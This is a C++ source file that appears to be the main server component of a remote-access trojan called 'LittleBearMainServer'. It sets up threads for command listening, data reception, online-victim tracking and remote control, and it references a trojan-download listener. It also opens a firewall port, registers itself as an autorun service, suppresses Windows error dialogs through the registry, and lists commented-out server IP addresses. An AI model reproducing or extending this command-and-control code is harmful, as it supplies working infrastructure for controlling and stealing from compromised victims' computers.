#include <windows.h>
#include <WinSock.h>
#include <shlwapi.h>
#include <time.h>

#include "LittleBearMainServer.h"
#include "Public.h"

#include "zconf.h"
#include "zlib.h"
#pragma comment(lib,"zlib.lib")

#include "LoginWindow.h"
#include "DownloadTrojanListener.h"
#include "DownloadProgramListener.h"
#include "CommandListener.h"
#include "DataListener.h"
#include "RemoteControlListener.h"
#include "OnlineManager.h"

#pragma comment(lib,"ws2_32.lib")
#include <Dbghelp.h>
#pragma comment(lib,"dbghelp.lib")

#include <map>
#include "PublicFunc.h"
#include "FileOperator.h"
#include "mysqlOper.h"
#include "test.h"
#include "recommit.h"

#pragma comment(lib,"kernel32.lib")
#pragma comment(lib,"user32.lib")
#pragma comment(lib,"gdi32.lib")


using namespace std;


//#define SERVER_IP_ADDRESS			"127.0.0.1"
//#define SERVER_IP_ADDRESS			"110.34.166.17"		//Longray0313	
//#define SERVER_IP_ADDRESS			"192.200.207.30"	//Longray0313
//https://www.vpnyu.com/page/testvpn.html this is a vpn test website,you can get 2 free vpn accounts


char szCurrentDir[MAX_PATH]		= {0};
DWORD dwIP						= 0;

map <HWND ,REMOTE_CONTROL_PARAM> RemoteCtrlParamMap;
map<HWND,REMOTE_CONTROL_PARAM >::iterator mapit;



int InitProgram()
{
#ifdef _DEBUG
	mytest();
#endif

	int iRet =  CheckIfProgramExist();
	if (iRet)
	{
		WriteLog("one program instance is already running\r\n");
		return FALSE;
		ExitProcess(0);
	}

	WSAData stWsa = { 0 };
	iRet = WSAStartup(WSASTARTUP_VERSION, &stWsa);
	if (iRet)
	{
		WriteLog("InitProgram WSAStartup error\r\n");
		return FALSE;
	}

	char szCurFileName[MAX_PATH] = {0};
	iRet = GetModuleFileNameA(0,szCurFileName,MAX_PATH);
	iRet = GetPathFromFullName(szCurFileName,szCurrentDir);
	iRet = SetCurrentDirectoryA(szCurrentDir);

	char szCommandDir[MAX_PATH];
	lstrcpyA(szCommandDir,szCurrentDir);
	lstrcatA(szCommandDir,COMMAND_DIR_NAME);
	lstrcatA(szCommandDir,"\\");
	iRet = MakeSureDirectoryPathExists(szCommandDir);

	lstrcpyA(szCommandDir,szCurrentDir);
	lstrcatA(szCommandDir,UPLOAD_FILE_DIR_NAME);
	lstrcatA(szCommandDir,"\\");
	iRet = MakeSureDirectoryPathExists(szCommandDir);

	lstrcpyA(szCommandDir,szCurrentDir);
	lstrcatA(szCommandDir,DOWNLOAD_FILE_DIR_NAME);
	lstrcatA(szCommandDir,"\\");
	iRet = MakeSureDirectoryPathExists(szCommandDir);

	lstrcpyA(szCommandDir,szCurrentDir);
	lstrcatA(szCommandDir,DOWNLOADPROGRAM_PATH);
	lstrcatA(szCommandDir,"\\");


	dwIP = GetIPFromConfigFile();
	if (dwIP == 0)
	{
		dwIP = INADDR_ANY;
		char szShowInfo[1024];
		wsprintfA(szShowInfo,"not found ip config file:%s%s error\r\n",szCurrentDir,IP_CONFIG_FILE);
		WriteLog(szShowInfo);
	}
	

	iRet = OpenFireWallPort();
	if (iRet == FALSE)
	{
		return FALSE;
	}

	//HANDLE hCloseMpssvc = CreateThread(0,0,(LPTHREAD_START_ROUTINE)CloseMpssvc,0,0,0);
	//CloseHandle(hCloseMpssvc);

#ifndef _DEBUG
	PublicFunction::addService(szCurFileName, "");
	PublicFunction::autorun();
#endif

#ifdef USE_MYSQL
	MySql::initLock();
#endif

	iRet = system("reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\Windows Error Reporting\" /v \"DontShowUI\" /t REG_DWORD /d 1 /f");

	return TRUE;
}








int __stdcall WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in LPSTR lpCmdLine, __in int nShowCmd )
{
	int iRet = 0;
#ifdef NEED_LOGIN_WINDOW
	iRet = GetSecondsFromStartDate();
	iRet = DialogBoxParamA(hInstance,(LPSTR)IDD_DIALOG1,0,(DLGPROC)LoginWindow,0);
	int error = GetLastError();
	if (iRet == FALSE && ERROR == FALSE)
	{
		ExitProcess(0);
	}
	CloseHandle(CreateThread(0,0,(LPTHREAD_START_ROUTINE)CheckProductValidation,0,0,0));
#endif



	iRet = InitProgram();
	if (iRet == 0)
	{
		WriteLog("InitProgram error\r\n");
		ExitProcess(0);
	}else{
		WriteLog("program start ok\r\n");
	}

	//HDC hdc = CreateDCA("display",0,0,0);
	//TEXTMETRICA stm;
	//GetTextMetricsA(hdc,&stm);

	DWORD cmdid = 0;
	HANDLE hCmdListenThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)CommandListener::NetWorkCommandListener,0,0,&cmdid);
	CloseHandle(hCmdListenThread);

// 	HANDLE hThreadlistencmd = OpenThread(THREAD_ALL_ACCESS,0,cmdid);
// 	CloseHandle(hThreadlistencmd);

	HANDLE hDataRecvThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)DataListener::NetWorkDataListener,0,0,0);
	CloseHandle(hDataRecvThread);

	//HANDLE hDataRecvThreadOld = CreateThread(0,0,(LPTHREAD_START_ROUTINE)NetWorkDataListener_Old,0,0,0);
	//CloseHandle(hDataRecvThreadOld);

	HANDLE hGetOnlineInfo = CreateThread(0,0,(LPTHREAD_START_ROUTINE)OnlineManager::RefreshOnlineInfo,0,0,0);
	CloseHandle(hGetOnlineInfo);

	HANDLE hRemoteControlThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)RemoteControlServer::RemoteControlListener,0,0,0);
	CloseHandle(hRemoteControlThread);

// 	HANDLE hDownloadThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)DownloadTrojanListener,0,0,0);
// 	CloseHandle(hDownloadThread);
// 
// 	HANDLE hDownloadProgThread = CreateThread(0,0,(LPTHREAD_START_ROUTINE)DownloadProgramListener,0,0,0);
// 	CloseHandle(hDownloadProgThread);

	HANDLE hThreadRecommit = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)Recommit::recommit, 0, 0, 0);
	CloseHandle(hThreadRecommit);
	
	while (TRUE)
	{
		Sleep(0xffffffff);
	}
	

	WSACleanup();
	ExitProcess(0);
	return TRUE;
}
